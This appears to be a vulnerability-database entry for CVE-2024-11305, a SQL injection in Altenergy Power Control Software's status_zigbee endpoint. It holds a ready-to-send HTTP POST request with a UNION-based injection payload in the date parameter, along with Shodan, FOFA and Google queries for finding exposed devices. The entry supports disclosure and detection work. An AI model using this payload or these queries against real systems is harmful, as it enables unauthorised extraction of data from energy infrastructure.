---
layout: post
cve_id: CVE-2024-11305
title: Altenergy Power Control Software - SQL Injection
pcap: true
pcap_path: /pcaps/2024/CVE-2024-11305.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-11305.yaml
snort2_rule: N/A
snort3_rule: N/A
author: s4e-io
severity: medium
impact: 'Authenticated attackers can execute SQL injection through the date parameter
  in the status_zigbee function to extract sensitive power system data including energy
  metrics and device configurations.

  '
remediation: 'Validate and sanitize all user inputs before processing them in SQL
  queries. Use parameterized queries or prepared statements to prevent SQL injection
  attacks.

  '
reference:
- https://blog.csdn.net/ZeroDay001/article/details/143878599
- https://cn-sec.com/archives/3447233.html
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L
  cvss-score: 6.3
  cve-id: CVE-2024-11305
  cwe-id: CWE-74
  epss-score: 0.42255
  epss-percentile: 0.97325
metadata:
  max-request: 1
  vendor: apsystems
  product: energy_communication_unit_firmware
  shodan-query: http.title:"altenergy power control software"
  fofa-query: title="altenergy power control software"
  google-query: intitle:"altenergy power control software"
tags:
- cve
- cve2024
- altenergy
- iot
- sqli
- vkev
- vuln
---

## üîç Vulnerability Description
A vulnerability classified as critical was found in Altenergy Power Control Software up to 20241108. This vulnerability affects the function get_status_zigbee of the file /index.php/display/status_zigbee. The manipulation of the argument date leads to sql injection. The attack can be initiated remotely.


## üåê HTTP Request
```nohighlight
POST /index.php/display/status_zigbee HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Content-Length: 230
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

date=2024-11-06%' UNION ALL SELECT 11,CHAR(113)||CHAR(75,101,86,69,115,83,113,89,100,122,121,102,83,83,113,86,84,112,100,103,69,75,80,117,88,109,83,105,89,116,110,120,76,84,73,109,115,100,83,107)||CHAR(113,118,98,98,113),11-- wPIB
```

